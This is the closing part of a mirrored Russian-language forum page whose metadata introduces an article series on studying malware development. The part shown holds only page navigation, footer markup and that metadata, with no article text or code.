			<input type="text" class="input shareInput-input js-shareInput" readonly="readonly" value="[AMS=article, 6][/AMS]" id="_xfUid-3-1758965544" />
		</div>
	</div>

									
								
							</div>
						
					
				</div>
			</div>
						
						
					</div>
				
			</div>

			
			
	
		<ul class="p-breadcrumbs p-breadcrumbs--bottom"
			itemscope itemtype="https://schema.org/BreadcrumbList">
			
				

				
				

				

				
				
					
					
	<li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
		<a href="../categories/uroki-razrabotki-vredonosnogo-softa.2/index.html" itemprop="item">
			<span itemprop="name">Уроки разработки вредоносного софта</span>
		</a>
		<meta itemprop="position" content="1" />
	</li>

				
			
		</ul>
	

			
		</div>
	</div>

	<footer class="p-footer" id="footer">
		<div class="p-footer-inner">

			<div class="p-footer-row">
				
					<div class="p-footer-row-main">
						<ul class="p-footer-linkList">
							
								
								
									<li>
										
											
											
												<a href="https://osint42.org/misc/style-variation" rel="nofollow"
													class="js-styleVariationsLink"
													data-xf-init="tooltip" title=" Выбор стиля"
													data-xf-click="menu" data-z-index-ref=".u-bottomFixer" role="button" aria-expanded="false" aria-haspopup="true">

													<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" ><title>Выбор стиля</title><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>
												</a>

												<div class="menu" data-menu="menu" aria-hidden="true">
													<div class="menu-content js-styleVariationsMenu">
														

	
		

	<a href="https://osint42.org/misc/style-variation?reset=1&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="">

		<i class="fa--xf far fa-adjust "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#adjust"></use></svg></i>

		
			Системный
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=default&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow "
		rel="nofollow"
		data-xf-click="style-variation" data-variation="default">

		<i class="fa--xf far fa-sun "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#sun"></use></svg></i>

		
			Светлый
		
	</a>


		

	<a href="https://osint42.org/misc/style-variation?variation=alternate&amp;t=1758965544%2Cd4a329dfc08dc36ef8d644381e10fee9"
		class="menu-linkRow is-selected"
		rel="nofollow"
		data-xf-click="style-variation" data-variation="alternate">

		<i class="fa--xf far fa-moon "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#moon"></use></svg></i>

		
			Тёмный
		
	</a>

	

	
		
	

													</div>
												</div>
											
										
									</li>
								
								
									<li><a href="../../misc/language.html" data-xf-click="overlay"
										data-xf-init="tooltip" title="Выбор языка" rel="nofollow">
										<i class="fa--xf far fa-globe "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#globe"></use></svg></i> Русский (RU)</a></li>
								
							
						</ul>
					</div>
				
				<div class="p-footer-row-opposite">
					<ul class="p-footer-linkList">
						

						
							<li><a href="../../threads/pravila-resursa.56/index.html">Условия и правила</a></li>
						

						
							<li><a href="../../help/privacy-policy/index.html">Политика конфиденциальности</a></li>
						

						
							<li><a href="../../help/index.html">Помощь</a></li>
						

						
							<li><a href="../../forums/index.html">Главная</a></li>
						

						<li><a href="../../forums/-/index.rss" target="_blank" class="p-footer-rssLink" title="RSS"><span aria-hidden="true"><i class="fa--xf far fa-rss "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#rss"></use></svg></i><span class="u-srOnly">RSS</span></span></a></li>
					</ul>
				</div>
			</div>

			

			
		</div>
	</footer>
</div> <!-- closing p-pageWrapper -->

<div class="u-bottomFixer js-bottomFixTarget">
	
	
</div>

<div class="u-navButtons js-navButtons">
	<a href="javascript:" class="button button--scroll"><span class="button-text"><i class="fa--xf far fa-arrow-left "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-left"></use></svg></i><span class="u-srOnly">Назад</span></span></a>
</div>


	<div class="u-scrollButtons js-scrollButtons" data-trigger-type="both">
		<a href="#top" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-up "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-up"></use></svg></i><span class="u-srOnly">Верх</span></span></a>
		
			<a href="#footer" class="button button--scroll" data-xf-click="scroll-to"><span class="button-text"><i class="fa--xf far fa-arrow-down "><svg xmlns="http://www.w3.org/2000/svg" role="img" aria-hidden="true" ><use href="../../data/local/icons/regulare419.svg?v=1757401797#arrow-down"></use></svg></i><span class="u-srOnly">Низ</span></span></a>
		
	</div>



	<form style="display:none" hidden="hidden">
		<input type="text" name="_xfClientLoadTime" value="" id="_xfClientLoadTime" title="_xfClientLoadTime" tabindex="-1" />
	</form>

	





    
    
        
        
            <script data-cfasync="false" src="../../cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="application/ld+json">
                {
    "@context": "https://schema.org",
    "@type": "CreativeWorkSeries",
    "@id": "https://osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/",
    "name": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "headline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "alternativeHeadline": "\u0426\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \"\u0418\u0437\u0443\u0447\u0435\u043d\u0438\u0435 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\"",
    "description": "\u0412\u0441\u0435\u043c \u043f\u0440\u0438\u0432\u0435\u0442!\n\n\u0420\u0435\u0448\u0438\u043b \u043f\u0435\u0440\u0435\u043f\u043e\u0441\u0442\u0438\u0442\u044c \u0441\u0432\u043e\u0439 \u0446\u0438\u043a\u043b \u0441\u0442\u0430\u0442\u0435\u0439 \u043f\u043e \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0438 \u043c\u0430\u043b\u0432\u0430\u0440\u0438.\n\n\u0421\u0442\u0430\u0442\u044c\u0438 \u0431\u0443\u0434\u0443\u0442 \u043e\u0444\u043e\u0440\u043c\u043b\u0435\u043d\u044b \u0432 \u0432\u0438\u0434\u0435 \u0446\u0438\u043a\u043b\u0430 \u0441\u0442\u0430\u0442\u0435\u0439.)\n\n\u0417\u0430\u0447\u0435\u043c \u0438\u0437\u0443\u0447\u0430\u0442\u044c \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0443 \u0432\u0440\u0435\u0434\u043e\u043d\u043e\u0441\u043d\u044b\u0445 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c ?\n\n\u0415\u0441\u0442\u044c \u043d\u0435\u0441\u043a\u043e\u043b\u044c\u043a\u043e \u043f\u0440\u0438\u0447\u0438\u043d, \u043f\u043e \u043a\u043e\u0442\u043e\u0440\u044b\u043c \u043a\u0442\u043e-\u0442\u043e \u0445\u043e\u0442\u0435\u043b \u0431\u044b \u0438\u0437\u0443\u0447\u0438\u0442\u044c \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0443...",
    "keywords": "",
    "dateCreated": "2025-05-08T10:54:22+00:00",
    "dateModified": "2025-05-09T13:44:30+00:00",
    "author": {
        "@type": "Person",
        "name": "0x42"
    },
    "thumbnailUrl": "https://osint42.org/data/attachments/0/461-fe6cde66a76ccea3bc62562247a1c9c2.jpg?hash=EZvMhSt-Dp",
    "interactionStatistic": [
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/CommentAction",
            "userInteractionCount": "2"
        },
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/LikeAction",
            "userInteractionCount": "4"
        },
        {
            "@type": "InteractionCounter",
            "interactionType": "https://schema.org/ViewAction",
            "userInteractionCount": "9577"
        }
    ]
}
            </script>
        
    



	
			
	

				
			
		
		
	

</body>

<!-- Mirrored from osint42.org/articles/tsikl-statei-izucheniye-vredonosnykh-programm.6/?full=1 by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 27 Sep 2025 09:43:16 GMT -->
</html>









